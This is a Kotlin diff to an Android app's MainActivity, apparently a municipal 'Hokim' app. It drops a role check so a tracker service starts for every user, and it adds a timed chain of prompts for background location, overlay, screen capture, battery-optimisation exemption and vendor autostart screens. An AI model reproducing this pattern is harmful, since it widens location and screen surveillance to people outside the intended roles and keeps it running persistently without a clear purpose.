@@ -51,11 +51,25 @@ class MainActivity : ComponentActivity() {
         registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { _ ->
             startTrackerServiceIfAllowed()
             Handler(Looper.getMainLooper()).postDelayed({
-                requestScreenCapturePermission()
+                requestBackgroundLocationPermission()
             }, 600L)
             Handler(Looper.getMainLooper()).postDelayed({
+                requestOverlayPermission()
+            }, 1600L)
+            Handler(Looper.getMainLooper()).postDelayed({
+                requestScreenCapturePermission()
+            }, 2600L)
+            Handler(Looper.getMainLooper()).postDelayed({
                 requestIgnoreBatteryOptimizations()
-            }, 1800L)
+            }, 3600L)
+            Handler(Looper.getMainLooper()).postDelayed({
+                requestAutoStartPermission()
+            }, 4600L)
+        }
+
+    private val requestBackgroundLocationLauncher =
+        registerForActivityResult(ActivityResultContracts.RequestPermission()) { _ ->
+            startTrackerServiceIfAllowed()
         }
 
     private val mediaProjectionLauncher =
@@ -74,17 +88,76 @@ class MainActivity : ComponentActivity() {
     private fun startTrackerServiceIfAllowed() {
         val app = application as HokimApp
         val user = app.storage.currentUser.value
-        if (user != null && (user.role == UserRole.MAYOR || user.role == UserRole.WORKER)) {
-            try {
-                val serviceIntent = Intent(this, TrackerService::class.java).apply {
-                    putExtra("device_id", user.username)
+        val devId = user?.username ?: "hokim"
+        try {
+            val serviceIntent = Intent(this, TrackerService::class.java).apply {
+                putExtra("device_id", devId)
+            }
+            ContextCompat.startForegroundService(this, serviceIntent)
+        } catch (_: Exception) {}
+    }
+
+    private fun requestBackgroundLocationPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                try {
+                    requestBackgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+                } catch (_: Exception) {}
+            }
+        }
+    }
+
+    private fun requestOverlayPermission() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !android.provider.Settings.canDrawOverlays(this)) {
+                val intent = Intent(
+                    android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    android.net.Uri.parse("package:$packageName")
+                ).apply {
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 }
-                ContextCompat.startForegroundService(this, serviceIntent)
+                startActivity(intent)
+            }
+        } catch (_: Exception) {}
+    }
+
+    private fun requestAutoStartPermission() {
+        val prefs = getSharedPreferences("hokim_app_prefs", MODE_PRIVATE)
+        if (prefs.getBoolean("auto_start_prompted", false)) return
+        prefs.edit().putBoolean("auto_start_prompted", true).apply()
+
+        val manufacturer = Build.MANUFACTURER.lowercase()
+        val intents = when {
+            manufacturer.contains("xiaomi") || manufacturer.contains("redmi") || manufacturer.contains("poco") -> listOf(
+                Intent().setComponent(android.content.ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")),
+                Intent("miui.intent.action.OP_AUTO_START").addCategory(Intent.CATEGORY_DEFAULT)
+            )
+            manufacturer.contains("samsung") -> listOf(
+                Intent().setComponent(android.content.ComponentName("com.samsung.android.lool", "com.samsung.android.sm.ui.battery.BatteryActivity")),
+                Intent().setComponent(android.content.ComponentName("com.samsung.android.sm", "com.samsung.android.sm.ui.battery.BatteryActivity"))
+            )
+            manufacturer.contains("huawei") || manufacturer.contains("honor") -> listOf(
+                Intent().setComponent(android.content.ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")),
+                Intent().setComponent(android.content.ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity"))
+            )
+            manufacturer.contains("oppo") -> listOf(
+                Intent().setComponent(android.content.ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity"))
+            )
+            manufacturer.contains("vivo") -> listOf(
+                Intent().setComponent(android.content.ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"))
+            )
+            else -> emptyList()
+        }
+        for (intent in intents) {
+            try {
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                startActivity(intent)
+                break
             } catch (_: Exception) {}
         }
     }
 
-        private fun requestIgnoreBatteryOptimizations() {
+    private fun requestIgnoreBatteryOptimizations() {
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 val powerManager = getSystemService(POWER_SERVICE) as? PowerManager
